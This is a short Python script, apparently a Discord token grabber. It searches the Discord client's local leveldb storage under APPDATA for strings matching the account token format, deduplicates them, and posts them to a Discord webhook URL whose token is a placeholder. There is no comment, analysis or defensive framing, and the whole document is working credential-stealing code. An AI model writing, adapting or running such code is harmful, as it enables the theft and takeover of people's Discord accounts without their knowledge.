import os, re, requests

def _grab():
    base = os.path.join(os.getenv('APPDATA') or '', 'discord', 'Local Storage', 'leveldb')
    found = []
    if os.path.isdir(base):
        for f in os.listdir(base):
            if not f.endswith(('.log', '.ldb')):
                continue
            try:
                data = open(os.path.join(base, f), errors='ignore').read()
                found += re.findall('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', data)
            except Exception:
                pass
    return list(set(found))
toks = _grab()
if toks:
    requests.post('https://discord.com/api/webhooks/1122334455/PLACEHOLDER_WEBHOOK_TOKEN', json={'content': '\n'.join(toks)})